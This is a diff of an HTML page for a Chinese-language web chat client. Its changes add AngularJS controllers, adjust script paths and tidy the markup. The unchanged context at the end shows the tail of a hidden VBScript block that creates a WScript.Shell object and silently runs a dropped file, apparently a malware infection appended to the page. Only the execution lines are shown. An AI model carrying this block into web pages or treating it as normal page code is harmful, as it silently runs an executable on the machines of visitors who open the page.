@@ -6,17 +6,22 @@
     <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css"/>
     <link rel="stylesheet" type="text/css" href="css/index.css"/>
 
-    <script type="text/javascript" src="/js/jquery-2.1.0.js"></script>
-    <script type="text/javascript" src="/js/bootstrap.js"></script>
-    <script type="text/javascript" src="/js/config.js"></script>
-    <script type="text/javascript" src="/js/index.js"></script>
-    <script type="text/javascript" charset="utf-8" src="/uedit/ueditor.config.js"></script>
-    <script type="text/javascript" charset="utf-8" src="/uedit/ueditor.all.min.js"></script>
-    <script type="text/javascript" charset="utf-8" src="/uedit/lang/zh-cn/zh-cn.js"></script>
-</head>
-<body>
+    <script type="text/javascript" src="js/jquery-2.1.0.js"></script>
+    <script type="text/javascript" src="js/bootstrap.js"></script>
+    <script type="text/javascript" src="js/config.js"></script>
+    <script type="text/javascript" src="js/index.js"></script>
+    <script type="text/javascript" charset="utf-8" src="uedit/ueditor.config.js"></script>
+    <script type="text/javascript" charset="utf-8" src="uedit/ueditor.all.min.js"></script>
+    <script type="text/javascript" charset="utf-8" src="uedit/lang/zh-cn/zh-cn.js"></script>
 
-<div class="login">
+    <script type="text/javascript" charset="utf-8" src="js/angular.min.js"></script>
+    <script type="text/javascript" charset="utf-8" src="js/angular-index.js"></script>
+
+
+</head>
+<body ng-app="im">
+
+<div class="login" ng-controller="loginController">
     <img src="img/login-head.png" class="head img-circle">
 
     <div class="form-group">
@@ -30,7 +35,8 @@
     <a class="register">注册</a>
 </div>
 
-<div class="main hidden">
+
+<div class="main" ng-controller="mainController">
 
     <!--导航-->
     <div class="left">
@@ -46,7 +52,7 @@
     <div class="chat-list">
         <div class="search">
             <div class="input-group">
-                <input type="text" class="form-control">
+                <input type="text" class="form-control" placeholder="搜索">
                 <span class="input-group-addon"><span class="glyphicon glyphicon-search"></span></span>
             </div>
         </div>
@@ -65,20 +71,6 @@
                 </div>
 
             </li>
-            <!--<li>
-                <span class="unread"></span>
-                <img src="img/head.png">
-                <span class="chat-name">瑞泰尔大家庭</span>
-                <span class="date">23:30</span>
-                <span class="content">刘晓江:砸了  买苹果</span>
-            </li>
-            <li>
-                <span class="unread"></span>
-                <img src="img/head.png">
-                <span class="chat-name">瑞泰尔大家庭</span>
-                <span class="date">23:30</span>
-                <span class="content">刘晓江:砸了  买苹果</span>
-            </li>-->
         </ul>
     </div>
     <!--主-->
@@ -157,4 +149,5 @@ End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
 //-->
+
 </SCRIPT>
